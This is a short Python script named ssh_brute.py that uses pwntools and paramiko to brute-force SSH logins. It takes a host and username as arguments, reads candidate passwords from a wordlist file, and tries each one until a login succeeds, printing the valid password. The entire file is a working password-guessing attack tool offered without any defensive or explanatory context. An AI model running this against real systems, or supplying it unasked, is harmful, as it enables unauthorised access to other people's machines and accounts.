                                           
from pwn import *

import paramiko
import sys

if len(sys.argv) != 3:
    sys.exit("use this format:\npython3 ssh_brute.py HOSTIP USERNAME")
host = sys.argv[1]
username = sys.argv[2]
attempts = 0
with open("passwords.txt", "r") as password:
    for password in password:
        password = password.strip("\n")
        try:
            print(f"[{attempts}] Attempting password: '{password}'!")
            response = ssh(host=host, user=username, password=password, timeout=1)
            if response.connected():
                print(f"[>] Valid password found: '{password}'!")
                response.close()
                break
            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print("[X] Invalid password!")
        attempts += 1

